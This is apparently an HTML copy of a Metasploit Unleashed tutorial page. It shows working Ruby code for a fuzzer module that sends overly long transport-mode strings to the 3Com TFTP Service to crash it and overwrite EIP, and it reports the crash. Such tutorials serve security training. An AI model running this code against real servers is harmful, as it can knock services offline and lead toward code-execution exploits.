@@ -1,0 +1,51 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Simple TFTP Fuzzer</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Simple
+TFTP Fuzzer</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">One of the most powerful aspects of
+Metasploit is how easy it is to
+make changes and create new functionality by reusing existing code. For
+instance, as this very simple fuzzer code demonstrates, you can make a
+few minor modifications to an existing Metasploit module to create a
+fuzzer module. The changes will pass ever-increasing lengths to the
+transport mode value to the 3Com TFTP Service for Windows, resulting in
+an overwrite of EIP.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">#Metasploit<br><br>require 'msf/core'<br>class Metasploit3 &lt; Msf::Auxiliary<br>        include Msf::Auxiliary::Scanner<br>        def initialize<br>                super(<br>                        'Name'           =&gt; '3Com TFTP Fuzzer',<br>                        'Version'        =&gt; '$Revision: 1 $',<br>                        'Description'    =&gt; '3Com TFTP Fuzzer Passes Overly Long Transport Mode String',<br>                        'Author'         =&gt; 'Your name here',<br>                        'License'        =&gt; MSF_LICENSE<br>                )<br>                register_options( [<br>                Opt::RPORT(69)<br>                ], self.class)<br>        end<br>        def run_host(ip)<br>                # Create an unbound UDP socket<br>                udp_sock = Rex::Socket::Udp.create(<br>                        'Context'   =&gt;<br>                                {<br>                                        'Msf'        =&gt; framework,<br>                                        'MsfExploit' =&gt; self,<br>                                }<br>                )<br>                count = 10  # Set an initial count<br>                while count &lt; 2000  # While the count is under 2000 run<br>                        evil = "A" * count  # Set a number of "A"s equal to count<br>                        pkt = "\x00\x02" + "\x41" + "\x00" + evil + "\x00"  # Define the payload<br>                        udp_sock.sendto(pkt, ip, datastore['RPORT'])  # Send the packet<br>                        print_status("Sending: #{evil}")  # Status update<br>                        resp = udp_sock.get(1)  # Capture the response<br>                        count += 10  # Increase count by 10, and loop<br>                end<br>        end<br>end</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Pretty straight forward. Lets run it
+and see what happens.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="color: rgb(0, 0, 0);" class="center">
+<div class="floatnone"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/File:EIP_Overwrite.jpg"
+ class="image"><img alt="EIP Overwrite.jpg"
+ src="http://www.offensive-security.com/w/images/1/12/EIP_Overwrite.jpg"
+ width="643" height="480"></a></div>
+</div>
+<p style="color: rgb(0, 0, 0);"><br>
+<br>
+And we have a crash! The fuzzer is working as expected. While this
+may seem simple on the surface, one thing to consider is the reusable
+code that this provides us. In our example, the payload structure was
+defined for us, saving us time, and allowing us to get directly to the
+fuzzing rather than researching the protocol. This is extremely
+powerful, and is a hidden benefit of the framework. <br>
+<br>
+</p>
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Writing_A_Simple_Fuzzer"
+ title="Writing A Simple Fuzzer">Writing a Simple Fuzzer</a></div>
+</body>
+</html>
